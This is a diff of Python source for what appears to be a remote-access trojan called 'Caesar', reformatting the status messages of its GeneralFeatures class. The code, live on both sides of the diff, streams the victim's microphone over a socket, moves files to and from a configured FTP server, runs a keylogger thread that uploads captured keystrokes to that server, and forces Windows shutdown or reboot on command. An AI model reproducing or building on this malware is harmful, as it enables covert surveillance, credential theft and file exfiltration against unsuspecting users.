@@ -25,9 +25,9 @@ class GeneralFeatures:
         def __init__(self):
             self.log = ""
             self.now = datetime.now()
-            self.KeyloggerThread = None
-            self.Keylogger = Keylogger()
             self.paudio = pyaudio.PyAudio()
+            self.Keylogger = Keylogger()
+            self.KeyloggerThread = None
             self.stop_event = threading.Event()
 
 
@@ -281,7 +281,6 @@ class GeneralFeatures:
         def live_audio_feed(self, conn):
             try:
                 conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
-
                 chunk = 20000
                 FORMAT = pyaudio.paInt16
                 channels = 1
@@ -309,9 +308,7 @@ class GeneralFeatures:
                 pass
 
 
-
         # ===================================================FTP FILE HANDLING===========================================
-
         def client_folder_exist(self, ftp, folderId, client_id):
             try:
                 if folderId in ftp.nlst():
@@ -330,64 +327,49 @@ class GeneralFeatures:
                 # print(e)
 
 
-
         # uploads file to ftp server
         def upload_file_via_ftp(self, conn, filename, FTP_PASS, folderId, client_id, FTP_HOST, FTP_USER):
             try:
                 ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
                 self.client_folder_exist(ftp, folderId, client_id)
-
                 ftp.encoding = "utf-8"
 
                 with open(filename, "rb") as file:
                     ftp.storbinary(f"STOR {filename}", file)
                 ftp.quit()
-
-                conn.send(
-                    "[+] File has been uploaded!!! \n".encode() + self.convert_caesar_text('Caesar ').encode() + str(
-                        os.getcwd() + ": ").encode())
+                conn.send(f"[+]File has been uploaded! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             except:
-                conn.send("[-] Something went wrong uploading file!!! \n".encode() + self.convert_caesar_text(
-                    'Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send(f"[-]Something went wrong uploading file! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
+
 
         # downloads file from ftp server
         def download_file_via_ftp(self, conn, filename, FTP_PASS, folderId, client_id, FTP_HOST, FTP_USER):
             try:
-
                 ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
                 ftp.encoding = "utf-8"
-
                 self.client_folder_exist(ftp, folderId, client_id)
-
                 with open(filename, "wb") as file:
                     ftp.retrbinary(f"RETR {filename}", file.write)
                 ftp.quit()
 
-                conn.send("[+] File has been Downloaded!!! \n".encode() + self.convert_caesar_text(
-                    'Caesar ').encode() + str(os.getcwd() + ": ").encode())
-
+                conn.send(f"[+]File has been downloaded successfully! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             except Exception as e:
-                print(e)
-                conn.send("[-] Something went wrong downloading file: {e} \n".encode() + self.convert_caesar_text(
-                    'Caesar ').encode() + str(os.getcwd() + ": ").encode())
-
+                conn.send(f"[-]Something went wrong downloading file: {e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
         # ===================================================FTP FILE HANDLING===========================================
 
 
-        # ===================================================Keylogger==================================================
 
+        # ===================================================Keylogger==================================================
         # starts keylogger
         def keylogger_handler(self, conn, filename, folderId, client_id, FTP_HOST, FTP_USER, FTP_PASS):
             try:
                 self.KeyloggerThread = threading.Thread(target=self.Keylogger.start_keylogger,
                                                         args=(filename, folderId, client_id, FTP_HOST, FTP_USER, FTP_PASS))
                 self.KeyloggerThread.start()
-                conn.send("[+] Keylogger started!!! \n".encode() + self.convert_caesar_text('Caesar ').encode() + str(
-                    os.getcwd() + ": ").encode())
+                conn.send(f"[+]Keylogger started! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             except:
-                conn.send("[-] Unable to start keylogger!!! \n".encode() + self.convert_caesar_text(
-                    'Caesar ').encode() + str(
-                    os.getcwd() + ": ").encode())
+                conn.send(f"[-]Unable to start keylogger! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
+
 
         # stops keylogger thread
         def stop_keylogger(self, conn):
@@ -395,48 +377,34 @@ class GeneralFeatures:
                 if self.KeyloggerThread.is_alive():
                     self.Keylogger.stop_timer()
                     self.KeyloggerThread.join()
-                    conn.send(
-                        "[+] Keylogger stopped!!! \n".encode() + self.convert_caesar_text('Caesar ').encode() + str(
-                            os.getcwd() + ": ").encode())
+                    conn.send(f"[+]Keylogger stopped! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                 else:
-                    conn.send(
-                        "[+] Keylogger is not active!!! \n".encode() + self.convert_caesar_text(
-                            'Caesar ').encode() + str(
-                            os.getcwd() + ": ").encode())
+                    conn.send(f"[-]Keylogger is not active! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             except Exception as e:
                 # print(e)
-                conn.send("[-]Error occurred while stopping keylogger!!! \n".encode() + self.convert_caesar_text(
-                    'Caesar ').encode() + str(
-                    os.getcwd() + ": ").encode())
+                conn.send(f"[-]Error occurred while stopping keylogger! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
-        # confirms if keylogger is running
+
+        # checks if keylogger thread is active
         def is_keylogger_active(self, conn):
             try:
                 if self.KeyloggerThread.is_alive():
-                    conn.send(
-                        "[+] Keylogger is active!!! \n".encode() + self.convert_caesar_text('Caesar ').encode() + str(
-                            os.getcwd() + ": ").encode())
+                    conn.send(f"[+]Keylogger is active! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                 else:
-                    conn.send(
-                        "[+] Keylogger is not active!!! \n".encode() + self.convert_caesar_text(
-                            'Caesar ').encode() + str(
-                            os.getcwd() + ": ").encode())
+                    conn.send(f"[+]Keylogger is not active! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             except:
-                conn.send(
-                    "[+] Keylogger is not active!!! \n".encode() + self.convert_caesar_text('Caesar ').encode() + str(
-                        os.getcwd() + ": ").encode())
-
+                conn.send(f"[+]Keylogger is not active! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
         # ===================================================Keylogger==================================================
 
 
-        #shut down system
+        # shut down system
         def shutdown(self, conn):
             try:
                 os.system("shutdown /s /t 0")
             except Exception as e:
                 conn.send(f"{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
-        #reboot system
+        # reboot system
         def reboot(self, conn):
             try:
                 os.system("shutdown -t 0 -r -f")
